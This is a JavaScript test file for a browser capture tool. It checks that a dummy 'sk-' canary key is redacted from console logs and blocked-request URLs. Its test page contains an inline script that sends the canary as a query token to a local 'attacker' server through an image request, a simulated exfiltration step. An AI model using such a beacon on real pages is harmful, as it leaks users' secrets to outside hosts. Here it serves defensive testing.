import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs/promises';
import http from 'node:http';
import path from 'node:path';

import { createBrowserRunner, createDomAdapter } from '../src/index.mjs';
import { findBrowserExecutable } from '../src/browser/discover.mjs';
import { tempDir } from './helpers.mjs';

const browserPath = findBrowserExecutable({});
const hasBrowser = Boolean(browserPath);
const CANARY = 'sk-canarycapture0123456789abcdef';
const VIEWPORTS = [{ name: 'desktop', width: 700, height: 500, deviceScaleFactor: 1 }];

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve(server.address().port));
  });
}

test('capture diagnostics and blocked URLs are redacted before they reach evidence', { skip: !hasBrowser }, async (t) => {
  const attacker = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'image/png' });
    res.end('');
  });
  const attackPort = await listen(attacker);
  t.after(() => new Promise((resolve) => attacker.close(() => resolve())));

  const page = `<!doctype html><html><body><div id="app">x</div><button id="action">go</button>
  <script>
    console.error('${CANARY}');
    const img = new Image(); img.src = 'http://127.0.0.1:${attackPort}/x.png?token=${CANARY}';
  </script></body></html>`;
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(page);
  });
  const port = await listen(server);
  t.after(() => new Promise((resolve) => server.close(() => resolve())));

  const out = await tempDir('capture-redaction-');
  const runner = createBrowserRunner({ executablePath: browserPath });
  const capture = await runner.runCapture({
    url: `http://127.0.0.1:${port}/`,
    adapter: createDomAdapter({
      id: 'redact',
      viewports: VIEWPORTS,
      readySelector: '#app',
      interactiveSelector: '#action',
      expectedHitId: 'action',
    }),
    outDir: out,
    captureId: 'redact',
  });

  const serialized = JSON.stringify(capture);
  assert.equal(serialized.includes(CANARY), false, 'canary survived in capture result');
  assert.ok(capture.viewports[0].diagnostics.console.length >= 1);
  assert.match(capture.viewports[0].diagnostics.console[0].text, /\[REDACTED:openai-style-key\]/);
  assert.ok(capture.viewports[0].network.blocked.length >= 1);
  assert.match(capture.viewports[0].network.blocked[0].url, /\[REDACTED:openai-style-key\]/);
});
